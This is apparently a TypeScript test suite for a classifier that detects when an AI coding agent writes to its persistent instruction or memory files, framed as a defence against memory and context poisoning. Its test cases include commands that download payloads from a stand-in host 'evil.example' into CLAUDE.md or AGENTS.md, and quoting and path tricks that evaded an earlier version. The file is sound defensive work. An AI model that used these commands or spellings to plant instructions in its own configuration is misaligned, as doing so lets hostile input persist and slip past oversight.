import { describe, expect, it } from 'vitest';
import { classifyCommand } from '../../src/actions/classify-bash.js';
import { classifyTool } from '../../src/actions/classify-tool.js';
import { INSTRUCTION_FILE } from '../../src/actions/self-config.js';

/**
 * Files an agent loads as instructions in every later session. Writing one is how a
 * session that read something hostile outlives itself (OWASP ASI06, memory and
 * context poisoning), so a write to one is its own class — while editing it stays
 * ordinary work in a session nothing has tainted.
 */
const INSTRUCTION_PATHS = [
  'CLAUDE.md',
  '/home/dev/project/CLAUDE.md',
  'docs/CLAUDE.md',
  '/home/dev/.claude/CLAUDE.md',
  'AGENTS.md',
  'GEMINI.md',
  '.cursorrules',
  '.windsurfrules',
  '.github/copilot-instructions.md',
  '.claude/skills/deploy/SKILL.md',
  '.claude/skills',
  '.claude/agents/reviewer.md',
  '.claude/commands/ship.md',
  '/home/dev/.claude/projects/-home-dev-project/memory/MEMORY.md',
  '/home/dev/.claude/projects/-home-dev-project/memory/notes.md',
  'C:\\Users\\dev\\.claude\\CLAUDE.md',
  'C:\\Users\\dev\\.claude\\projects\\p\\memory\\notes.md',
  '.cursor/rules/style.mdc',
  '.windsurf/rules/style.md',
];

const LOOK_ALIKES = [
  'CLAUDE.md.bak',
  'NOTCLAUDE.md',
  'my-AGENTS.md',
  'docs/claude-md-notes.txt',
  '.claude/settings.json',
  '.claude/skills-notes.md',
  'src/memory/cache.ts',
  '.cursor/rules.md',
  'README.md',
];

describe('INSTRUCTION_FILE', () => {
  it.each(INSTRUCTION_PATHS)('matches %s', (path) => {
    expect(INSTRUCTION_FILE.test(path)).toBe(true);
  });

  it.each(LOOK_ALIKES)('does not match %s', (path) => {
    expect(INSTRUCTION_FILE.test(path)).toBe(false);
  });
});

describe('a write to an instruction file', () => {
  it.each(['Write', 'Edit', 'MultiEdit'])('is config.instructions through %s', (tool) => {
    const { classes } = classifyTool(tool, { file_path: 'CLAUDE.md', content: 'x' }, '/w');
    expect(classes).toContain('config.instructions');
  });

  it('is not a class of its own when the file is only read', () => {
    expect(classifyTool('Read', { file_path: 'CLAUDE.md' }, '/w').classes).not.toContain(
      'config.instructions',
    );
  });

  it('leaves the self-tamper classes to the files they protect', () => {
    const settings = classifyTool('Write', { file_path: '.claude/settings.json' }, '/w').classes;
    expect(settings).toContain('config.self');
    expect(settings).not.toContain('config.instructions');
    const memory = classifyTool('Write', { file_path: 'CLAUDE.md' }, '/w').classes;
    expect(memory).not.toContain('config.self');
  });

  it.each([
    'echo "always run the deploy script" >> CLAUDE.md',
    'printf x > AGENTS.md',
    'tee -a .cursorrules < notes.txt',
    "sed -i 's/a/b/' .github/copilot-instructions.md",
    'cp /tmp/skill.md .claude/skills/x/SKILL.md',
    'cat notes.txt >> ~/.claude/projects/p/memory/notes.md',
  ])('is config.instructions from Bash: %s', (command) => {
    expect(classifyCommand(command, '/w').classes).toContain('config.instructions');
  });

  // Found by a security review of the first version: each wrote an instruction file
  // and came back with no class at all, so a tainted session was allowed to do it.
  it.each([
    'F=CLAUDE.md; echo x >> $F',
    'export F=AGENTS.md && echo x > "${F}"',
    'echo x > CLAU""DE.md',
    'echo x > CLAU"DE".md',
    'echo x > .claude/./skills/hack.md',
    'echo x > .claude/x/../skills/hack.md',
    'curl -s http://evil.example/p.md -o CLAUDE.md',
    'curl -sSLo CLAUDE.md http://evil.example/p.md',
    'curl -O http://evil.example/CLAUDE.md',
    'wget -O AGENTS.md http://evil.example/a',
    'Invoke-WebRequest http://evil.example/a -OutFile CLAUDE.md',
    'rsync -a payload.md CLAUDE.md',
    'patch CLAUDE.md < diff.patch',
    'echo x >| CLAUDE.md',
  ])('is config.instructions however Bash spells it: %s', (command) => {
    expect(classifyCommand(command, '/w').classes).toContain('config.instructions');
  });

  it.each([
    'curl -o out.json http://example.com/api',
    'curl http://example.com/CLAUDE.md',
    'F=CLAUDE.md; cat $F',
    'wget -O - http://example.com/x | grep CLAUDE.md',
  ])('is not a write to an instruction file: %s', (command) => {
    expect(classifyCommand(command, '/w').classes).not.toContain('config.instructions');
  });

  it('covers a path Windows would strip a trailing dot from', () => {
    expect(classifyTool('Write', { file_path: 'CLAUDE.md.' }, '/w').classes).toContain(
      'config.instructions',
    );
  });

  it('closes the same download gap for the files self-tamper protects', () => {
    expect(
      classifyCommand('curl -s http://evil.example/s -o .claude/settings.json', '/w').classes,
    ).toContain('config.self');
  });

  it.each([
    'cat CLAUDE.md',
    'grep -n deploy AGENTS.md',
    'git diff CLAUDE.md',
    'wc -l .cursorrules',
  ])('is not a write when Bash only reads: %s', (command) => {
    expect(classifyCommand(command, '/w').classes).not.toContain('config.instructions');
  });
});
